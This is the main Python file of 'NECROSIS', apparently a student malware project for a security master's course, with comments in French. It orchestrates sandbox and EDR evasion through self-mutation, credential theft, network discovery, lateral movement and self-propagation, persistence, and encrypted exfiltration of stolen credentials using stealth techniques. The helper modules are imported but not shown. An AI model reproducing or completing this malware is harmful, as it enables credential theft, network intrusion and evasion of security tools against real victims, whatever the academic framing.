#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NECROSIS - Malware Caméléon Autonome
Version finale - Master 2 Sécurité
"""

import os
import sys
import logging
import time
import json
import subprocess
from datetime import datetime
from pathlib import Path

# Import des services
from services.environment_detector import EnvironmentDetector
from services.credential_siphon import credential_siphon
from services.pivoting import PivotingEngine
from services.persistence import PersistenceManager
from services.exfiltration import ExfiltrationManager
from services.aes_service import aes_service
from services.rsa_service import rsa_service
from services.mutator import CodeMutator
from utils.utils import get_machine_id, sleep_with_jitter, relaunch_app

# Configuration du logging (désactivé en production pour furtivité)
logging.basicConfig(level=logging.INFO if os.getenv("DEBUG") else logging.WARNING,
                    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")
logger = logging.getLogger("NECROSIS")


class NecrosisMalware:
    def __init__(self):
        self.machine_id = get_machine_id()
        self.credentials = []
        self.targets = []
        self.aes_key = None
        self.mutation_count = int(os.getenv("MUTATION_COUNT", 0))
        self.env_detector = EnvironmentDetector()
        self.siphon = credential_siphon
        self.pivoting = PivotingEngine()
        self.persistence = PersistenceManager()
        self.exfiltration = ExfiltrationManager()
        self.mutator = CodeMutator()
        self.current_source = Path(__file__).resolve()

    def run(self):
        # ============================================================
        # PHASE 0 : Vérification de l'environnement et mutation si nécessaire
        # ============================================================
        env_report = self.env_detector.analyze()

        # Si détection de sandbox/EDR et que nous n'avons pas encore muté
        if (env_report["is_sandbox"] or env_report["has_edr"]) and self.mutation_count < 3:
            logger.warning("⚠️ Environnement suspect détecté, mutation en cours...")
            # Générer un nouveau fichier muté
            new_file = self.mutator.mutate(self.current_source, mutation_level=min(3, self.mutation_count+1))
            # Relancer le nouveau fichier avec le même interpréteur
            logger.info(f"🔄 Relance du code muté : {new_file}")
            # Transmettre le compteur de mutations via variable d'environnement
            env = os.environ.copy()
            env["MUTATION_COUNT"] = str(self.mutation_count + 1)
            subprocess.Popen([sys.executable, str(new_file)], env=env)
            sys.exit(0)  # Quitter l'instance actuelle

        logger.info("🦎 NECROSIS démarre (environnement accepté)")

        # ============================================================
        # PHASE 1 : Détection Environnementale (analyse complète)
        # ============================================================
        logger.info("📡 Analyse de l'environnement...")
        # On conserve le rapport pour éventuelles adaptations
        logger.info(f"   Rapport : {env_report}")

        # ============================================================
        # PHASE 2 : Extraction Universelle d'identifiants
        # ============================================================
        logger.info("💉 Extraction des identifiants...")
        self.credentials = self.siphon.extract_all()
        logger.info(f"✅ {len(self.credentials)} identifiants extraits")

        # ============================================================
        # PHASE 3 : Pivotement et Mouvement Latéral autonome
        # ============================================================
        logger.info("🔄 Pivotement / Mouvement latéral...")
        if self.credentials:
            self.targets = self.pivoting.discover_network()
            logger.info(f"📡 {len(self.targets)} machines découvertes")

            # Tentative de connexion avec chaque identifiant
            for cred in self.credentials[:10]:   # Limite pour l'exemple
                success = self.pivoting.try_credentials(cred, self.targets[:5])
                if success:
                    logger.info("✅ Pivotement réussi, propagation en cours...")
                    self.pivoting.propagate(self.current_source)  # propage le binaire
                    break
            else:
                logger.warning("⚠️ Aucun pivotement réussi")
        else:
            logger.warning("⚠️ Pas d'identifiants pour pivoter")

        # ============================================================
        # PHASE 4 : Persistance et Exfiltration chiffrée
        # ============================================================
        logger.info("🔒 Persistance et exfiltration...")
        if self.persistence.install():
            logger.info("✅ Persistance installée")

        if self.credentials:
            # 1. Génération d'une clé AES unique
            self.aes_key = aes_service.get_new_code()
            # 2. Sérialisation des credentials
            creds_dict = [cred.__dict__ if hasattr(cred, '__dict__') else cred for cred in self.credentials]
            creds_json = json.dumps(creds_dict)
            # 3. Chiffrement AES-GCM
            encrypted_creds = aes_service.encrypt(creds_json)
            # 4. Chiffrement de la clé AES avec RSA (publique)
            encrypted_aes_key = rsa_service.encrypt(self.aes_key)
            # 5. Construction du payload final
            payload = {
                "machine_id": self.machine_id,
                "aes_key": encrypted_aes_key,
                "encrypted_credentials": encrypted_creds,
                "targets": [t.__dict__ if hasattr(t, '__dict__') else t for t in self.targets],
                "timestamp": datetime.now().isoformat(),
                "mutation_count": self.mutation_count
            }
            # 6. Exfiltration avec mécanismes furtifs (jitter, compression, User-Agent)
            success = self.exfiltration.exfiltrate(payload)
            logger.info(f"📤 Exfiltration {'réussie' if success else 'échouée'}")

        logger.info("🏁 NECROSIS terminé.")


if __name__ == "__main__":
    try:
        malware = NecrosisMalware()
        malware.run()
        time.sleep(10*60)
    except KeyboardInterrupt:
        logger.info("Arrêt demandé")
    except Exception as e:
        logger.error(f"❌ Erreur fatale: {e}")
        # En cas d'erreur, on pourrait tenter une réexécution après mutation
        # mais on laisse pour l'instant.